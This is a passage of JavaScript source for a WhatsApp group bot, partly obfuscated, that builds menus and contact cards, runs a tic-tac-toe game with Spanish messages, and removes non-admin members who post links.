_0x212414=['Script','️LIST\x20MENU','sendMessage','user','Status','MP3','1299kwYfZn','\x0aitem1.TEL;waid=','MakerMenu','push','Developer\x20','3152eteMVX','SINGLE_SELECT','https://github.com/dcode-denpa/bitch-boot','prepareMessageFromContent','audio/mp4','MP4','GroupMenu','Hai\x20kak\x20','45pyDoPy','wait','notify','Jadibot','SOURCE\x20CODE','contactsArrayMessage','OwnerMenu','3368466xnSDyx','DownloadMenu','contacts','vname',',\x20Silahkan\x20pilih\x20menu\x20disini','3339875KRAxWB','4525568rJeYcJ','244909dLsGYf','relayWAMessage','OtherMenu','*_©\x20Dcode\x20Denpa_*','\x0aitem1.X-ABLabel:Ponsel\x0aEND:VCARD','split','extendedTextMessage','481554qazfTP','DEVELOPER','don\x27t\x20click\x20here\x20!!!','log','\x20-\x20','LIST\x20MENU','Creator','1185836IEdnLq'];_0x39d9=function(){return _0x212414;};return _0x39d9();}button==_0x2039a5(0x1dd)&&(console['log'](_0x2039a5(0x1dd)),reply(mess[_0x2039a5(0x1e1)]),confumods[_0x2039a5(0x1cf)](from,anu4,video,{'quoted':mek}));if(button==_0x2039a5(0x1c6)){console[_0x2039a5(0x1c8)](_0x2039a5(0x1c6));let ini_list=[];for(let i of ConfuMods){const vname=confumods[_0x2039a5(0x1e9)][i]!=undefined?confumods[_0x2039a5(0x1e9)][i][_0x2039a5(0x1ea)]||confumods[_0x2039a5(0x1e9)][i][_0x2039a5(0x1e2)]:undefined;ini_list[_0x2039a5(0x1d6)]({'displayName':_0x2039a5(0x1d7)+NamaBot,'vcard':'BEGIN:VCARD\x0aVERSION:3.0\x0aN:Sy;Dcode\x20Denpa;;;\x0aFN:'+(vname?''+vname:''+confumods[_0x2039a5(0x1d0)]['name'])+_0x2039a5(0x1d4)+i[_0x2039a5(0x1c3)]('@')[0x0]+':'+i['split']('@')[0x0]+_0x2039a5(0x1c2)});}confumods['sendMessage'](from,{'displayName':_0x2039a5(0x1d7)+NamaBot,'contacts':ini_list},_0x2039a5(0x1e5),{'quoted':mek,'contextInfo':{'forwardingScore':0x1fc,'isForwarded':!![]}});}function _0x22b6(_0x293272,_0x1e5921){const _0x39d9cd=_0x39d9();return _0x22b6=function(_0x22b6fe,_0x5823d5){_0x22b6fe=_0x22b6fe-0x1bb;let _0x3a1107=_0x39d9cd[_0x22b6fe];return _0x3a1107;},_0x22b6(_0x293272,_0x1e5921);}if(button==_0x2039a5(0x1ca)){console[_0x2039a5(0x1c8)](_0x2039a5(0x1ca));let bitch=confumods[_0x2039a5(0x1db)](from,{'listMessage':{'title':'','description':_0x2039a5(0x1df)+pushname+_0x2039a5(0x1bb),'buttonText':_0x2039a5(0x1ce),'footerText':_0x2039a5(0x1c1),'listType':_0x2039a5(0x1d9),'sections':[{'title':jmn+'\x20-\x20'+week+'\x20'+weton+_0x2039a5(0x1c9)+calender,'rows':[{'title':_0x2039a5(0x1cd),'rowId':''},{'title':'Speed','rowId':''},{'title':_0x2039a5(0x1d1),'rowId':''},{'title':_0x2039a5(0x1cb),'rowId':''},{'title':_0x2039a5(0x1e3),'rowId':''},{'title':'Runtime','rowId':''},{'title':_0x2039a5(0x1e6),'rowId':''},{'title':_0x2039a5(0x1d5),'rowId':''},{'title':_0x2039a5(0x1de),'rowId':''},{'title':_0x2039a5(0x1c0),'rowId':''},{'title':_0x2039a5(0x1e8),'rowId':''}]}]}},{});confumods[_0x2039a5(0x1bf)](bitch);}
if (isTTT && isPlayer1){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return reply('Ingrese los números correctamente')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return reply('Ya lleno, los otros contenidos')
if (main[0].gilir.includes(sender)) return reply('Espera tu turno')
s = '❌'
main[0].angka[nuber] = s
main[0].gilir = main[0].player1
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
ucapan1 = `*🎳Resultado del juego Tictactoe 🎲

*Yeyyy el ganador es *@${tty.player1.split('@')[0]}*\n`
ucapan2 = `*🎳Resultado del juego Tictactoe 🎲*

*El resultado final:*

${ttt}`
cnf.sendMessage(from, ucapan1, text, {quoted:mek, contextInfo:{mentionedJid: [tty.player1]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()

if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()

if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()

if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()

if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()

if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()

if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()

if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()

if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*🎳 Result Game Tictactoe 🎲*

*_Empate🥀_*`
ucapan2 = `*🎳 Resultado del juego Tictactoe 🎲*

*El resultado final:*

${ttt}`
reply(ucapan1)
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
ucapan = `*🎳 Juego Tictactoe 🎲*

Player2 @${tty.player2.split('@')[0]}=⭕
Player1 @${tty.player1.split('@')[0]}=❌

${ttt}

Turno de = @${tty.player2.split('@')[0]}`
 cnf.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
}
if (isTTT && isPlayer2){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return reply('Ingrese los números correctamente')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return reply('Ya lleno, los otros contenidos 🥺')
if (main[0].gilir.includes(sender)) return reply('Espera tu turno 🥀')
s = '⭕'
main[0].angka[nuber] = s
main[0].gilir = main[0].player2
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
ucapan1 = `*🎳 Resultado del juego Tictactoe 🎲*

*Yeyyy el ganador es @${tty.player2.split('@')[0]}*\n`
ucapan2 = `*🎳 Juego Tictactoe 🎲*

*El resultado final:*

${ttt}`
cnf.sendMessage(from, ucapan1, text, {quoted:mek, contextInfo:{mentionedJid: [tty.player2]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()
if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()
if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()
if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()
if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()
if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()
if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()
if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()
if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*🎳Resultado del juego Tictactoe ??*

*_Serie de juegos_* `
speech2 = `*🎳 Resultado del juego Tictactoe*

*El resultado final:*

${ttt}`
reply(ucapan1)
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
ucapan = `*🎳 Juego Tictactoe 🎲*

Player1 @${tty.player1.split('@')[0]}=⭕
Player2 @${tty.player2.split('@')[0]}=❌

${ttt}
 
Turno de = @${tty.player1.split('@')[0]}`
 cnf.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
 }

        if (budy.includes('.com')){
					if (!isGroup) return
					if (!isAntiLink) return
					if (isGroupAdmins) return reply('Te salvaste eres admin 🧐')
										var kic = `${sender.split("@")[0]}@s.whatsapp.net`
					reply(`Enlace detectado 🗡️ @${sender.split("@")[0]}`)
					cnf.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)
					}, 0)
				    }


					if (isGroup && isSimi && budy != undefined) {
						console.log(budy)
						muehe = await simih(budy)
						console.log(muehe)
						reply(muehe)
					} else {
						return //console.log(color('[WARN]','red'), 'Unregistered Command from', color(sender.split('@')[0]))
					}
                           
                           
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
		}
	})
}
starts()
